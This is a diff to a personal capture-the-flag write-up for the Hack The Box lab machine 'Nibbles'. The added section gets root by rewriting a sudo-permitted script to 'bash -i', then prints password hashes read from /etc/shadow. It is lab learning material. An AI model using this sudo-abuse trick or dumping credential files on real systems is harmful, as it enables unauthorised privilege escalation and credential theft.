@@ -1,10 +1,11 @@
 # Nibbles 10.10.10.75 - Linux
 
- - __User__:
- - __Root__:
+ - __User__: 006 - 1st Attempt
+ - __Root__: 006 - 1st Attempt
 
-## Initial Attempt, 05/05/2020
+## Initial Attempt, 05/06/2020
 
+### Enumeration
 
 ```shell
 Nmap scan report for 10.10.10.75
@@ -114,6 +115,7 @@ Browsing `http://10.10.10.75/nibbleblog/content/`, some bits:
 <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
 <plugin name="Latest posts" author="Diego Najar" version="3.7" installed_at="1512926436">
 ```
+### Exploitation - User Space
 
 Can access `http://10.10.10.75/nibbleblog/admin/` and browse directories but can't seem to access php files.
 
@@ -204,3 +206,35 @@ nibbler:x:1001:1001::/home/nibbler:
 
  - PHP is 5.6
  - nibbler's password is not nibbles
+
+### Exploitation - Root Escalation
+
+If you look at `sudo -l` you can see that `nibbler` has permissions to sudo his personal monitor script:
+
+```shell
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+So, we can make `monitor.sh` be w/e we want. In this case let's make it:
+
+```shell
+bash -i
+```
+
+This will simply return an interactive bash shell. But we are allowed to `sudo` this script, so the bash context will return as root.
+
+`sudo ./monitor.sh` - and waaaaait for it...
+
+```shell
+root@Nibbles:/home/nibbler/personal/stuff#
+```
+
+### Post Root
+
+Relevant contents of `/etc/shadow`:
+
+```shell
+nibbler:$6$X3A8Ojo1$ZixRGB1HEQv552mnnJALZ6hOStYqqJuMoUsFipTFJl22OBupNaqGluyidsq4bZ2oBxr2YH/p4.v/ZaMosY4jZ/:17511:0:99999:7:::
+root:$6$DewMP6p.$vV1WdlCbgZJkOM98Qw7Dur.A.4YOq910laHkQZu/uMuomOjKntzg5GSsl8pYT0qtW9I.YMkr3HBC0Sw/s3TKq0:17511:0:99999:7:::
+```
